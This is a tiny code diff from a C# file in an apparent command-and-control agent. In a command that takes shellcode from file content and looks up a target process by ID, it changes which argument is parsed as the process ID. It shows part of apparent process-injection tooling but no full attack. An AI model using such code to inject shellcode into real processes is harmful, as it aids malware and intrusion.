@@ -34,7 +34,7 @@ namespace Agent.Commands
 
             var shellcode = fileContent;
 
-            int processId = int.Parse(task.SplittedArgs[1]);
+            int processId = int.Parse(task.SplittedArgs[0]);
 
             var process = Process.GetProcessById(processId);
             if(process == null)
